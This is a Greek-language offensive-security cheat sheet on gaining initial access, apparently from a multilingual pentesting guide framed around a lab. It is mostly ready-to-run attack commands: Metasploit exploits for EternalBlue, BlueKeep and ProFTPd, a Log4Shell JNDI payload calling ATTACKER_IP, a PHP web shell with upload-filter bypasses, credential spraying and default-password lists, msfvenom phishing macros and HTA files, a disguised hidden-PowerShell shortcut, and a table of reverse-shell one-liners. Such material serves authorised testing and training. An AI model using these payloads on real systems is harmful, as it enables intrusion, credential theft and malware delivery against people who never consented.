# 🚪 Φάση 1: Αρχική πρόσβαση (Initial Access)

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../01-Initial-Access.md) • [🇮🇹 Italiano](01-Initial-Access.it.md) • [🇹🇷 Türkçe](01-Initial-Access.tr.md)

```
  ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗          █████╗  ██████╗ ██████╗███████╗███████╗███████╗
  ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
  ██║██╔██╗ ██║██║   ██║   ██║███████║██║         ███████║██║     ██║     █████╗  ███████╗███████╗
  ██║██║╚██╗██║██║   ██║   ██║██╔══██║██║         ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
  ██║██║ ╚████║██║   ██║   ██║██║  ██║███████╗    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║
  ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
```

**Στόχος:** Απόκτηση της πρώτης πρόσβασης σε ένα σύστημα ή δίκτυο του εργαστηρίου.

---

## Πριν ξεκινήσετε

Η **αρχική πρόσβαση** είναι το πρώτο σημείο εισόδου σε ένα σύστημα. Μπορεί να προκύψει από ευπάθεια μιας εφαρμογής, από εκτεθειμένη υπηρεσία ή από στοιχεία σύνδεσης. Η απόκτηση πρόσβασης δεν συνεπάγεται αυτόματα δικαιώματα διαχειριστή.

**Βασικοί όροι:** **Ευπάθεια (vulnerability)** είναι μια αδυναμία ασφαλείας. **Exploit** είναι κώδικας ή διαδικασία που την αξιοποιεί. **Payload** είναι ο κώδικας που επιδιώκεται να εκτελεστεί. **Shell** είναι ένα περιβάλλον πληκτρολόγησης εντολών. Σε ένα **reverse shell**, το σύστημα-στόχος ξεκινά τη σύνδεση προς το σύστημα του ελεγκτή. Ο **listener** περιμένει αυτή τη σύνδεση σε μια θύρα.

Στα παραδείγματα Metasploit, το `RHOSTS` προσδιορίζει τον στόχο, ενώ τα `LHOST` και `LPORT` τη διεύθυνση και τη θύρα της επιστροφής σύνδεσης. Κάθε παράδειγμα έχει ξεχωριστές προϋποθέσεις. Ένας τίτλος CVE ή μια ανοικτή θύρα δεν αποδεικνύει από μόνος του ότι το σύστημα είναι ευάλωτο.

## Περιεχόμενα

- [🎯 Τρόποι εισόδου (Attack Vectors)](#section-01)
- [💻 Εκμετάλλευση γνωστών ευπαθειών](#section-02)
- [🌐 Επιθέσεις σε εφαρμογές ιστού](#section-03)
- [🔐 Επιθέσεις σε στοιχεία σύνδεσης](#section-04)
- [📧 Αρχεία και κώδικας για σενάρια ηλεκτρονικού ψαρέματος (Phishing)](#section-05)
- [🖥️ Εκμετάλλευση υπηρεσιών απομακρυσμένης πρόσβασης](#section-06)
- [🎧 Ρύθμιση αναμονής εισερχόμενων συνδέσεων (Listeners)](#section-07)
- [📊 Γρήγορη αναφορά](#section-08)
- [🔗 Σχετικοί οδηγοί αναφοράς](#section-09)

<a id="section-01"></a>

## 🎯 Τρόποι εισόδου (Attack Vectors)

| Τρόπος εισόδου | Περιγραφή |
| -------- | ------------- |
| **Εκμετάλλευση εφαρμογής προσβάσιμης από το διαδίκτυο** | Ευπάθειες σε εφαρμογές ιστού, διεπαφές API και συστήματα διαχείρισης περιεχομένου (CMS) |
| **Ηλεκτρονικό ψάρεμα (Phishing)** | Παραπλανητικά μηνύματα που μεταφέρουν κακόβουλο κώδικα ή αρχεία |
| **Έγκυρα στοιχεία σύνδεσης** | Δοκιμή λίγων κωδικών σε πολλούς χρήστες ή χρήση ήδη διαρρευμένων συνδυασμών |
| **Υπηρεσίες εξωτερικής πρόσβασης** | Υπηρεσίες RDP, SSH, VPN ή FTP προσβάσιμες από έξω |
| **Αλυσίδα εφοδιασμού λογισμικού (Supply Chain)** | Παραβίαση λογισμικού που θεωρείται έμπιστο |

---

<a id="section-02"></a>

## 💻 Εκμετάλλευση γνωστών ευπαθειών

### Αναζήτηση παραδειγμάτων εκμετάλλευσης (Exploits)
```bash
# SearchSploit — αναζήτηση στην τοπική βάση παραδειγμάτων εκμετάλλευσης
searchsploit apache 2.4
searchsploit -m 41234  # αντιγραφή παραδείγματος στον τρέχοντα κατάλογο
searchsploit --nmap scan.xml  # ανάγνωση αποτελεσμάτων Nmap

# Αναζήτηση στο Metasploit
msfconsole -q -x "search type:exploit apache"
```

### Γνωστά παραδείγματα εκμετάλλευσης

#### EternalBlue (MS17-010) - Windows SMB
```bash
# Έλεγχος αν υπάρχει η συγκεκριμένη ευπάθεια
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# Εκμετάλλευση με Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 10.10.10.10
run
```

#### Log4Shell (CVE-2021-44228)
```bash
# Δοκιμή για την ευπάθεια
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/a}' http://target.com

# Παράδειγμα διακομιστή για το συγκεκριμένο exploit
java -jar JNDI-Exploit.jar -C "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" -A ATTACKER_IP
```

#### ProxyShell/ProxyLogon - Exchange
```bash
# Έλεγχος για ProxyShell
nmap -p 443 --script http-vuln-exchange-proxyshell 192.168.1.10

# Χρήση παραδείγματος εκμετάλλευσης
python3 proxyshell_exploit.py -t https://exchange.target.com -e attacker@evil.com
```

---

<a id="section-03"></a>

## 🌐 Επιθέσεις σε εφαρμογές ιστού

### Έγχυση SQL και πρόσβαση σε περιβάλλον εντολών (SQL Injection)
```bash
# Έλεγχος για έγχυση SQL (SQLi)
sqlmap -u "http://target.com/page?id=1" --batch

# Πρόσβαση σε εντολές λειτουργικού συστήματος μέσω SQLi
sqlmap -u "http://target.com/page?id=1" --os-shell

# Πρόσβαση σε περιβάλλον εκτέλεσης ερωτημάτων SQL
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

### Μεταφόρτωση αρχείου για εκτέλεση εντολών
```bash
# Δημιουργία κώδικα PHP για αντίστροφη σύνδεση εντολών
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# Εναλλακτικό απλό παράδειγμα εκτέλεσης εντολών μέσω PHP
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Παραδείγματα ονομάτων αρχείων για έλεγχο φίλτρων επεκτάσεων
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
```

### Απομακρυσμένη εκτέλεση κώδικα (RCE)
```bash
# Έλεγχος απομακρυσμένης εκτέλεσης κώδικα (RCE)
curl "http://target.com/cmd.php?cmd=id"
curl "http://target.com/cmd.php?cmd=whoami"

# Αντίστροφη σύνδεση εντολών μέσω RCE
curl "http://target.com/cmd.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.10.10/4444%200>%261'"
```

---

<a id="section-04"></a>

## 🔐 Επιθέσεις σε στοιχεία σύνδεσης

### Δοκιμή λίγων κωδικών σε πολλούς λογαριασμούς (Password Spraying)

Το password spraying δοκιμάζει λίγους κοινούς κωδικούς σε πολλούς λογαριασμούς. Κάποια παραδείγματα του πρωτοτύπου χρησιμοποιούν ολόκληρες λίστες κωδικών και αποτελούν γενικότερες δοκιμές σύνδεσης, όχι αυστηρά password spraying.

```bash
# CrackMapExec - SMB
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --continue-on-success

# CrackMapExec - WinRM
crackmapexec winrm 192.168.1.0/24 -u users.txt -p passwords.txt

# Hydra - SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Hydra - RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
```

### Επαναχρησιμοποίηση διαρρευμένων στοιχείων σύνδεσης (Credential Stuffing)

Χρησιμοποιούνται ήδη γνωστοί συνδυασμοί ονόματος χρήστη και κωδικού, για να ελεγχθεί αν επαναχρησιμοποιούνται σε άλλη υπηρεσία.

```bash
# Χρήση ήδη γνωστών διαρρευμένων στοιχείων σύνδεσης
hydra -C creds.txt ftp://192.168.1.10

# Μορφή του αρχείου creds.txt:
# username:password
```

### Προεπιλεγμένα στοιχεία σύνδεσης

Πρόκειται για στοιχεία που έχουν οριστεί από κατασκευαστή ή εγκατάσταση και ενδέχεται να μην έχουν αλλάξει.

```bash
# Συνηθισμένα προεπιλεγμένα στοιχεία σύνδεσης:
admin:admin
admin:password
root:root
root:toor
administrator:password

# CrackMapExec με συνηθισμένα στοιχεία σύνδεσης
crackmapexec smb 192.168.1.10 -u admin -p 'admin'
```

---

<a id="section-05"></a>

## 📧 Αρχεία και κώδικας για σενάρια ηλεκτρονικού ψαρέματος (Phishing)

### Κώδικας μακροεντολής Office (Macro Payload)
```bash
# Δημιουργία κώδικα για μακροεντολή
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba -o macro.vba

# Εναλλακτικά μέσω msfconsole
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
run
```

### Κώδικας σε αρχείο εφαρμογής HTML (HTA)
```bash
# Δημιουργία αρχείου HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta

# Διάθεση του αρχείου μέσω τοπικού διακομιστή
python3 -m http.server 80
```

### Κώδικας μέσω συντόμευσης Windows (LNK)
```powershell
# Δημιουργία συντόμευσης που εκκινεί τον κώδικα του παραδείγματος
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\Users\Public\Resume.lnk")
$link.TargetPath = "cmd.exe"
$link.Arguments = "/c powershell -ep bypass -w hidden -c IEX(payload)"
$link.IconLocation = "C:\Windows\System32\notepad.exe"
$link.Save()
```

---

<a id="section-06"></a>

## 🖥️ Εκμετάλλευση υπηρεσιών απομακρυσμένης πρόσβασης

### Εκμετάλλευση υπηρεσίας απομακρυσμένης επιφάνειας εργασίας (RDP)
```bash
# Διαδοχικές δοκιμές στοιχείων σύνδεσης μέσω RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10

# BlueKeep (CVE-2019-0708)
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.10
run
```

### Εκμετάλλευση υπηρεσίας ασφαλούς απομακρυσμένης σύνδεσης (SSH)
```bash
# Διαδοχικές δοκιμές στοιχείων σύνδεσης μέσω SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Σύνδεση SSH με γνωστά στοιχεία
ssh user@192.168.1.10

# Σύνδεση SSH με ιδιωτικό κλειδί
ssh -i id_rsa user@192.168.1.10
```

### Εκμετάλλευση υπηρεσίας μεταφοράς αρχείων (FTP)
```bash
# Ανώνυμη σύνδεση
ftp 192.168.1.10
# Όνομα χρήστη: anonymous
# Κωδικός πρόσβασης: anonymous

# Διαδοχικές δοκιμές στοιχείων σύνδεσης (Brute Force)
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

# Παράδειγμα εκμετάλλευσης ProFTPd
msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.1.10; run"
```

---

<a id="section-07"></a>

## 🎧 Ρύθμιση αναμονής εισερχόμενων συνδέσεων (Listeners)

Ο listener περιμένει εισερχόμενη σύνδεση. Πρέπει να ταιριάζει με τον τύπο του payload· ένας απλός listener Netcat δεν αντικαθιστά γενικά τον handler του Meterpreter.


### Αναμονή σύνδεσης με Netcat
```bash
nc -lvnp 4444
```

### Διαχείριση εισερχόμενης σύνδεσης με Metasploit (Handler)
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

### Powercat (PowerShell)
```powershell
# Στο σύστημα του ελεγκτή
powercat -l -p 4444

# Στο σύστημα-στόχο
powercat -c 10.10.10.10 -p 4444 -e cmd.exe
```

---

<a id="section-08"></a>

## 📊 Γρήγορη αναφορά

### Εντολές μίας γραμμής για αντίστροφη σύνδεση εντολών (Reverse Shell)

| Περιβάλλον | Εντολή |
| ---- | --------- |
| **Bash** | `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` |
| **Python** | `python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` |
| **PowerShell** | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1\|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"` |
| **PHP** | `php -r '$s=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |

---

<a id="section-09"></a>

## 🔗 Σχετικοί οδηγοί αναφοράς

- [Metasploit](../../Metasploit/translations/README.el.md)
- [SQLMap](../../SQLMap/translations/README.el.md)
- [Hydra](../../Hydra/translations/README.el.md)
- [Ευπάθειες εφαρμογών ιστού: SSRF](../../SSRF/translations/README.el.md)

---

**Επόμενη φάση:** [02 — Αναγνώριση και απαρίθμηση →](02-Enumeration.el.md)

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
